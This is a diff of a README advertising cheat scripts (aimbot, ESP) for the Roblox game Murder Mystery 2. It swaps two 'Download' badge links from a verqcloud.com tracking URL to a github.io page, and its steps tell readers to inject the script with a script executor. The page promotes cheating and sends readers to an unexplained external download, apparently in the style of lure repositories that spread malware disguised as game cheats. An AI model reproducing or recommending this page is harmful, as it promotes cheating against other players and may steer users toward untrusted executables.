@@ -2,7 +2,7 @@
 
 **Murder Mystery 2 Scripts** are powerful tools designed to enhance your experience in Murder Mystery 2. With a range of features from aimbot to ESP, these scripts give you the upper hand in the game and allow you to control your gameplay like never before.
 
-[![Download MM2 Scripts](https://img.shields.io/badge/Download-MM2%20Scripts-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download MM2 Scripts](https://img.shields.io/badge/Download-MM2%20Scripts-blueviolet)](https://murder-mystery-2-scripts.github.io/.github/)
 
 ## ⚙️ Features
 
@@ -23,4 +23,4 @@
 3. Inject the script into the game (using a script executor).
 4. Use the provided hotkeys to activate the cheats and enhance your gameplay.
 
-[![Download MM2 Scripts](https://img.shields.io/badge/Download-MM2%20Scripts-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
+[![Download MM2 Scripts](https://img.shields.io/badge/Download-MM2%20Scripts-blueviolet)](https://murder-mystery-2-scripts.github.io/.github/)
